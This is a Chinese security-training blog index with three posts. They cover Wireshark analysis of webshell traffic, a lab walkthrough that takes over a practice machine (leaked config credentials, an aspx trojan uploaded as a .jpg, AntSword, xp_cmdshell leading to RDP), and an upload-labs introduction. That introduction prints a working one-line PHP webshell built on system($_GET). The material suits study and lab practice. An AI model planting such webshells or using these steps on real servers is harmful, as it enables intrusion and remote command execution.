<!DOCTYPE html>
<html lang="en">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Tangxianshen" />


    
    


<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Tangxianshen">
<meta name="twitter:card" content="summary">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">



<link rel="stylesheet" href="/css/style.css">



    <style> .article { opacity: 0;} </style>


<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Hexo</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: true,
        isPost: false,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: false
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






<meta name="generator" content="Hexo 6.3.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/R-C.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>

        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>Menu</li>
                        <li>Tags</li>
                        
                        <li>Friends</li>
                        
                        
                        <li>About Me</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">专注于前端</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/R-C.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
</nav>
      <div class="body-wrap">
  
    <article id="post-Burp,Yakit导入证书，流量分析，四大webshell管理工具" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/13/Burp,Yakit%E5%AF%BC%E5%85%A5%E8%AF%81%E4%B9%A6%EF%BC%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%8C%E5%9B%9B%E5%A4%A7webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/" class="article-date">
      <time datetime="2024-01-13T15:08:10.000Z" itemprop="datePublished">2024-01-13</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/13/Burp,Yakit%E5%AF%BC%E5%85%A5%E8%AF%81%E4%B9%A6%EF%BC%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%8C%E5%9B%9B%E5%A4%A7webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/">Burp,Yakit导入证书，流量分析，四大webshell管理工具</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="Burp-Yakit导入证书"><a href="#Burp-Yakit导入证书" class="headerlink" title="Burp,Yakit导入证书"></a>Burp,Yakit导入证书</h2><h3 id="Burp导入证书"><a href="#Burp导入证书" class="headerlink" title="Burp导入证书"></a>Burp导入证书</h3><p>1.首先要把Burp Suite的CA证书下载到本地,让火狐浏览器开了127.0.0.1:8080代理才可以下载证书，也就是要让Burp Suite能抓到浏览器的http包的情况下，才能访问到 <a target="_blank" rel="noopener" href="https://burp/">https://burp</a>。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705069863974-8ec09d83-3a32-4c46-a4a8-d9fadccabfcc.png"><br>2.打开下图浏览器代理插件，新建情景模式，协议，服务器，端口按Burp中的修改，改成图中的样子。然后开启代理<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070095102-c765e123-484b-4637-a503-d024e8ba4c84.png" alt="image.png"><br>3.访问<a target="_blank" rel="noopener" href="https://burp/">https://burp</a>，下载证书<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070206807-f0a50752-7af9-463d-95e8-d424524c9531.png" alt="image.png"><br>4.在浏览器的设置中搜索证书<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070443107-59d1bf8c-2134-4e63-88cc-03504042fc23.png" alt="image.png"><br>5.导入CA证书，勾选两个信任。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070477835-b29c9c06-9021-44f6-9b89-40baf4bbbf20.png" alt="image.png"></p>
<p>6.在火狐浏览器访问百度<a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com/</a>，观察Burp的历史记录，发现Burp可以抓到https的包了！<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705070912042-ccb3161b-34ab-43c6-935e-7311b09fa22f.png" alt="image.png"></p>
<h3 id="Yakit导入证书"><a href="#Yakit导入证书" class="headerlink" title="Yakit导入证书"></a>Yakit导入证书</h3><p>1.打开Yakit,先点高级配置，再点证书下载。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705071194211-7d936d80-4380-4564-aa64-f2eafca60a09.png" alt="image.png"><br>2.接下来的步骤与Burp的4~6步相同，不再赘述。</p>
<h2 id="流量分析（考试题）"><a href="#流量分析（考试题）" class="headerlink" title="流量分析（考试题）"></a>流量分析（考试题）</h2><h3 id="流量走向图"><a href="#流量走向图" class="headerlink" title="流量走向图"></a>流量走向图</h3><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705135344744-0cd6280f-b861-4be9-abd2-d56e5b5f1f7d.png" alt="image.png"><br>分析</p>
<ul>
<li><p>浏览器请求http的数据包，yakit的监听端口8083（可改），Burp的监听端口8080（可改）监听到数据包并抓取，流量从浏览器到Yakit和Burp，再到Clash，最终通过节点出去。</p>
</li>
<li><p>爬虫程序中的代理部分，和.exe文件的流量，通过Proxifier代理软件，转到Clash的节点出去。</p>
</li>
<li><p>Wireshark是一款网络协议分析工具，它主要工作在网络层及以上的层级。具体来说，Wireshark可以分析的数据包范围包括：</p>
<p>网络层：如IPv4、IPv6等协议的数据包。<br>传输层：如TCP、UDP等协议的数据包。<br>数据链路层：如PPP、HDRC、ARP协议的数据包<br>应用层：如HTTP、HTTPS、FTP、SMTP、DNS等应用层协议的数据包。</p>
</li>
</ul>
<h3 id="皮卡包分析"><a href="#皮卡包分析" class="headerlink" title="皮卡包分析"></a>皮卡包分析</h3><p>1.下载老师的114.pcapng（抓的蚁剑的包）。输入过滤命令：<code>(ip.src_host==192.168.2.114 or ip.dst_host==192.168.2.114) and http</code>，然后按下图操作<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705139779611-09f3f039-848b-4ea4-ab88-787628239a73.png" alt="Image.png"><br>2.红色部分代表发出，蓝色部分代表返回<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705139922607-827d778d-0d2c-45fb-a47c-df19826ccf4a.png" alt="image.png"></p>
<ol start="3">
<li>介绍了在线加密和解密网站  <a target="_blank" rel="noopener" href="https://icyberchef.com/">https://icyberchef.com/</a>   to Base64—加密   from—解密<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705140147540-4e5d3c69-f198-496f-afa8-ddc5bb9eeec3.png" alt="image.png"><br>4.把下图1过程左边的URL拖到下图的位置，把之前的全部红色部分复制到右上框，在另外一个网页访问 <a target="_blank" rel="noopener" href="https://icyberchef.com/">https://icyberchef.com/</a>   把2过程的from base64拖到下图位置，把红色部分的最后一行复制有上框，在右上框从第一个字符一个一个删，直至得到操作者的命令。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705140771975-a0d4bd05-fc94-4ffe-b859-18df2470525b.png" alt="image.png"></li>
</ol>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144032076-320423ef-c914-4b56-861d-368e825c7a3b.png" alt="Image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144055440-9e3ff96c-89f4-4485-a4d9-0caad0bb1ed2.png" alt="Image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144078009-92cbe922-5bbb-43f3-a952-3f94d6ef4c1a.png" alt="Image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705144090689-fe9486c2-6b5b-444a-9d1c-161e89ee9637.png" alt="Image.png"><br>5.下载老师的db.pcapng（抓sqlmap的包）输入过滤命令：<code>(ip.src_host==192.168.2.70 or ip.dst_host==192.168.2.70) and http</code>，然后和之前的步骤一样，追踪流-——&gt;到解码网站解码<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705142088054-8e3366dc-c8c8-435a-99f4-d7c2f055fff3.png" alt="image.png"><br>6.对上图的解码出的sql语句分析，获取第9个字符，判断他是否大于1，大于1则返回true,小于1则返回false，下图是比较第8行和第9行的不同。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705143564256-82f024d5-50db-407e-ad75-13cc5d64f04a.png" alt="image.png" style="zoom:67%;" /></p>
<h2 id="四大webshell管理工具"><a href="#四大webshell管理工具" class="headerlink" title="四大webshell管理工具"></a>四大webshell管理工具</h2><p>蚁剑（AntSword）： 蚁剑是一款开源的WebShell客户端，支持多种编程语言和平台。其主要功能包括文件管理、数据库管理、虚拟终端等。蚁剑的特点是具有强大的插件系统，可以扩展其功能。此外，蚁剑的流量特征较为明显，容易被安全设备识别。<br>菜刀（Chopper）： 菜刀是一款经典的WebShell管理工具，具有文件管理、数据库管理、虚拟终端等功能。菜刀的流量特征较为明显，通常会被安全设备识别。菜刀的Webshell通常使用一句话木马，执行函数如@eval、@assert等。<br>哥斯拉（Godzilla）： 哥斯拉是一款功能强大的Webshell权限管理工具，支持多种类型的Shell，包括PHP、JSP、ASP等。哥斯拉的特点是全部类型的Shell都能绕过市面上的大部分静态查杀和流量WAF。此外，哥斯拉还具有流量加密功能，可以绕过大部分的流量检测。哥斯拉还自带插件，如冰蝎、蚁剑等，可以实现更多的功能。<br>冰蝎（Behinder）： 冰蝎是一款动态二进制加密的Webshell管理客户端，主要基于Java开发，因此可以跨平台使用。冰蝎的特点是客户端基于Java，兼容性较好。冰蝎的Webshell通常使用Base64加密，以避免被检测。其流量特征较为明显，容易被安全设备识别。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-攻破靶机3，xpcmd_shell提权" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/13/%E6%94%BB%E7%A0%B4%E9%9D%B6%E6%9C%BA3%EF%BC%8Cxpcmd_shell%E6%8F%90%E6%9D%83/" class="article-date">
      <time datetime="2024-01-13T14:56:32.000Z" itemprop="datePublished">2024-01-13</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/13/%E6%94%BB%E7%A0%B4%E9%9D%B6%E6%9C%BA3%EF%BC%8Cxpcmd_shell%E6%8F%90%E6%9D%83/">攻破靶机3，xpcmd_shell提权</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p>1.下载AttackMachine镜像，打开AttackMachine虚拟机。打开桌面的武器库中的Nmap-<br>Zenmap GUI，输入命令：<code>nmap -p- 192.168.2.197</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704977290982-e5929f1d-9650-4723-8fd5-e56977aaa9f5.png" alt="Image.png"></p>
<h2 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h2><p>打开御剑后台扫描工具，在域名处输入http：&#x2F;&#x2F;192.168.2.197:27689&#x2F;  开始扫描<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704976906442-8b11f617-522d-42f1-b419-0a58f751e467.png" alt="image.png"></p>
<h2 id="登录文件上传系统"><a href="#登录文件上传系统" class="headerlink" title="登录文件上传系统"></a>登录文件上传系统</h2><p>1.在武器库的浏览器访问192.168.2.197:27689<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704977914799-6d421459-3b37-42b8-ae5f-847697b8ff04.png" alt="image.png"><br>2.因为之前扫到了robots.txt文件，尝试打开另一个网页访问192.168.2.197&#x2F;robots.txt<br>发现有两个文件，但没有什么用<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704979906080-f51c2b58-3937-4d63-8778-81a6f70ba619.png#averageHue=%23efeeeb&clientId=u190a0499-6ac5-4&from=paste&height=374&id=u9ae5524b&originHeight=374&originWidth=340&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51702&status=done&style=none&taskId=u308c3760-a74b-40e8-8eb2-0f66fb5472d&title=&width=340" alt="image.png"><br>3.用kali来扫目录，输入命令<code>dirsearch -u http://192.1682.197:27689 -x 403</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704980928757-1dafd58e-ff5f-459a-86f7-190c183dbe37.png#averageHue=%23242a31&clientId=u190a0499-6ac5-4&from=paste&height=676&id=u3a7cf51e&originHeight=676&originWidth=1139&originalType=binary&ratio=1&rotation=0&showTitle=false&size=515870&status=done&style=none&taskId=ub6202cb0-398b-4cff-8261-85e3a896d64&title=&width=1139" alt="image.png"><br>发现config.js，config.js 是一个配置文件，它在各种应用程序中用于存储配置设置。这个文件通常包含了应用程序运行所必需的设置，如数据库连接信息、API密钥、服务端口、环境变量等。访问&#x2F;js&#x2F;config.js<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704982330794-b03af0a9-d474-45f6-85af-2a0191888e80.png#averageHue=%23f3f3f1&clientId=u2c49fb85-0133-4&from=paste&height=447&id=u299889d7&originHeight=447&originWidth=433&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84111&status=done&style=none&taskId=uf1843aa8-9f01-469d-a2fc-dfff892d722&title=&width=433" alt="image.png"><br>发现是一些编码，没有什么用。<br>4.访问default.aspx。发现还是登录页面<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704982665607-9fd2d9ca-61d3-428b-8fcf-2ec2bfda533f.png" alt="image.png"></p>
<p>5.访问&#x2F;web.config.bak。发现弹出一个窗口。尝试保存config.bak文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704983417775-3d154fa3-9193-43ef-81c7-5eba48665d5d.png" alt="image.png"><br>6.用记事本打开config.bak文件，发现用户名：down   密码：downsql  把这两记录下来。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704983553394-f3946d8b-d940-4f9f-892a-3c1d1ec82982.png#averageHue=%23f8f8f8&clientId=uf8bf4b3a-fd32-4&from=paste&height=594&id=u31528798&originHeight=594&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=152762&status=done&style=none&taskId=ue715bec7-126a-4930-a39b-95ce9fb51d0&title=&width=835" alt="image.png"></p>
<ol start="7">
<li>然后尝试去登录文件上传系统，发现登不进去。然后我们去思考扫描出来的开放的1433端口，sqlserver数据库的默认端口号正是1433端口。我们尝试去连接sqlserver数据库。下图是常见数据库默认端口，必记。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705067630506-a0ee2a93-8901-4c02-a81e-b905d33055f6.png#averageHue=%23f7f6f5&clientId=u5c96cd8b-c7f3-4&from=paste&height=429&id=ud1409434&originHeight=429&originWidth=462&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31791&status=done&style=none&taskId=ue16a71bc-30ca-44ad-b247-c49e8586dfd&title=&width=462" alt="image.png"></li>
</ol>
<p>8.打开武器库的Navicat,连接sqlserver。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704984228374-7982d392-9482-4731-9f7b-9561d6f7ce22.png#averageHue=%23c1c1c1&clientId=uf8bf4b3a-fd32-4&from=paste&height=491&id=u72096783&originHeight=491&originWidth=430&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32210&status=done&style=none&taskId=ub9351f9e-bdd6-475a-8236-294a4d251c1&title=&width=430" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704984276624-4baab891-e3e4-4a38-9b4a-212766f72045.png" alt="image.png"><br>填写用户名：down   密码：downsql<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704985551106-513dedfd-e1f9-4681-b1a3-7b7668257598.png" alt="image.png"><br>9.找到用户列表userLists，发现admin和他的密码<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704985895843-d5020136-6d97-4265-9afe-fe609608e5ab.png" alt="image.png"><br>10.然后去登录admin, 登陆成功，获得第一个key<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704986062311-131dce03-3c06-4c58-ad76-4708e40f490d.png" alt="image.png"></p>
<h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><p>1.找到文件上传，翻到第三页，发现文件过长会被截取，因为这是一个aspx网站，所以我们要找一个aspx木马上传。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705061291701-b636fe2e-7d90-499a-920b-dc2162c70cb3.png" alt="image.png"><br>2.在武器库中找到aspx木马，找到名称为一句话木马的文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705061444832-018f1895-3e39-4db6-8654-dcdd3c88e368.png" alt="image.png"><br>3.因为这个木马文件拖不出来，右击它并用cmd打开，用python写web程序。输入命令<code>python -m Simple HttpServer 80</code> 运行这个命令后， Python 解释器将启动 SimpleHTTPServer 服务，并且默认会在当前工作目录下提供一个 HTTP 服务。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705061858380-40d2f8a5-32ac-4a6c-849b-2017e658daa2.png" alt="image.png"><br>4.在主机的浏览器访问AttackMachine虚拟机的ip地址，然后下载木马文件。并把这个文件重命名为123defgh.jpg<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705062398289-36c0a266-30a2-453a-b293-187cb0d8478d.png#averageHue=%23292e23&clientId=u6cc2c564-ed7c-4&from=paste&height=327&id=u932be3f4&originHeight=327&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&size=188467&status=done&style=none&taskId=u7e14266b-fa1f-44ee-91a3-aafbf20e2e1&title=&width=1176" alt="image.png"><br>5.上传木马成功。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705063261270-8742829a-9543-43dd-8b71-7528e1eb164e.png#averageHue=%23c9c7c5&clientId=u6cc2c564-ed7c-4&from=paste&height=335&id=udd0a066c&originHeight=335&originWidth=1103&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71505&status=done&style=none&taskId=u62b84920-4871-4bf9-a963-e5227c6a510&title=&width=1103" alt="image.png"></p>
<h2 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h2><p>1..然后去找木马的路径，右击这个木马文件，复制链接到另一个网页，删木马名称的几个字母，一般让浏览器访问不到这个文件，它就会报错，显示木马的路径。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705063761816-435e7e19-7d96-4789-96ee-f4400bfa34d7.png" alt="image.png"><br>2.复制木马的路径到kali的蚁剑，密码为abcd,连接蚁剑。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1705064321473-01ee06df-596d-421c-8b87-2d13720087da.png#averageHue=%23f7f7f7&clientId=u6cc2c564-ed7c-4&from=paste&height=431&id=uffa3d926&originHeight=431&originWidth=605&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51718&status=done&style=none&taskId=ue5d57972-4254-46fc-9912-6e76d6afb9c&title=&width=605" alt="image.png"><br>3.在蚁剑的文件里找到了Kay2！<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705064651744-5108cc2a-6076-410e-9291-9089a54ebdd3.png" alt="image.png"></p>
<h2 id="xpcmd-shell提权"><a href="#xpcmd-shell提权" class="headerlink" title="xpcmd_shell提权"></a>xpcmd_shell提权</h2><p>1.在config.bak文件里发现了新数据库：FileManage  新用户名sa，新密码cisp pte@sa   所以我们尝试去Navicat去连接并登录这个数据库（属于SQLserver数据库）。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705064836132-5159adbc-e4d5-41e3-ac22-bda4af23401c.png" alt="image.png"><br>2.新建查询，目的是使用命令，实现远程桌面连接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705065929566-f24e8c3b-1ef1-4f4f-858e-4faa98ed1f06.png" alt="image.png"><br>3.在主机的搜索框内输入rdp,以管理员身份运行   远程桌面连接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705066664850-12191b19-d7dc-4651-8827-47e2470b9e73.png" alt="image.png"><br>4.在新建的查询中改用户名和密码。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705067072995-e42e8bba-9cbb-40ef-b4c7-5d0213aac4c6.png" alt="f4c90cff3c9dceb6199c562e2629786.png"><br>5.重新去实现远程桌面连接，登陆靶机桌面成功，获得最后的key3</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1705067046588-31a376a1-e334-4244-853c-e0efceddbeeb.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
      <time datetime="2024-01-13T14:50:56.000Z" itemprop="datePublished">2024-01-13</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p> 文件上传漏洞是发生在有上传功能的应用中,如果应用程序对用户的上传文件没有控制或者存在缺陷,攻击者可以利用应用上传功能存在的缺陷，上传木马病毒等有危害的文件到服务器上面，控制服务器。<br> 文件上传漏洞产生的主要原因是:应用中存在上传功能,但是上传的文件没有经过严格的合法性检验或者检验函数存在缺陷，导致可以上传木马文件到服务器。文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果。  </p>
<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704894978322-9705649c-8e54-4437-8c41-6cb7d714db3b.png" alt="ea2ba82593a538bf915fcb8f6cba4b9.png"></p>
<h2 id="webshell的编写"><a href="#webshell的编写" class="headerlink" title="webshell的编写"></a>webshell的编写</h2><h3 id="webshell的含义"><a href="#webshell的含义" class="headerlink" title="webshell的含义"></a>webshell的含义</h3><p>webshell通常被称为匿名用户（入侵者）通过网站端口对网站服务器的某种程度上操作的权限。它大多以动态脚本的形式存在，因此也有人称之为网站的后门工具。</p>
<h3 id="webshell的编写-1"><a href="#webshell的编写-1" class="headerlink" title="webshell的编写"></a>webshell的编写</h3><pre><code> 在vscode创建一个.php文件，编写木马程序。下面是一个简单的木马
</code></pre>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码接受一个名为a的GET参数，并使用@system函数执行该参数指定的命令。</p>
<h2 id="upload-labs靶场闯关"><a href="#upload-labs靶场闯关" class="headerlink" title="upload-labs靶场闯关"></a>upload-labs靶场闯关</h2><h3 id="upload-labs靶场的介绍"><a href="#upload-labs靶场的介绍" class="headerlink" title="upload-labs靶场的介绍"></a>upload-labs靶场的介绍</h3><p>介绍：一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种 上传漏洞 的靶场。</p>
